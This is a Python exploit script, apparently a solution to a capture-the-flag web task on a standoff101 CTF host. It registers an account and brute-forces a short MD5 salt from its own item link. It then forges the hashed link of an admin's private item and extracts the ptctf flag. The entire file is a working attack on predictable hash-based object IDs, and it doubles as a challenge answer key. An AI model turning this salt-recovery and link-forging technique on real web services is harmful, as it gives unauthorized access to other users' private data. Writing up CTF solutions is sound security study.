#!/usr/bin/env python3

import hashlib
import requests
import random
import itertools
from string import ascii_letters, printable
from urllib.parse import unquote
import re

target = "https://pomidor.tasks.ctf.standoff101.ru/{}"

s = requests.Session()
username = "".join(random.choices(ascii_letters, k=16))
password = "".join(random.choices(ascii_letters, k=16))
s.post(target.format("register"), data={"username": username, "password": password})
s.post(target.format("login"), data={"username": username, "password": password})

my_pomidors = s.get(target.format("pomidors/my")).content
direct_link = re.findall(rb'<a href="/pomidors/([0-9a-f]+)"', my_pomidors)[0].decode()  # first link always id 0
salt = ""
for i in itertools.product(printable, repeat=3):
    salt = "".join(i)
    if (
        hashlib.md5(f"{salt}:{username}:0:%!d(bool=false)".encode()).hexdigest() == direct_link
    ):  # лень парсить приватность помидора id 0
        break
else:
    print("couldn't recover salt")
    exit()

print(f"recovered {salt = }")

content = s.get(
    target.format(f"pomidors/{hashlib.md5(f'{salt}:admin:1337:%!d(bool=true)'.encode()).hexdigest()}")
).content

print(re.findall(r"ptctf\{.*?\}", unquote(content))[0])
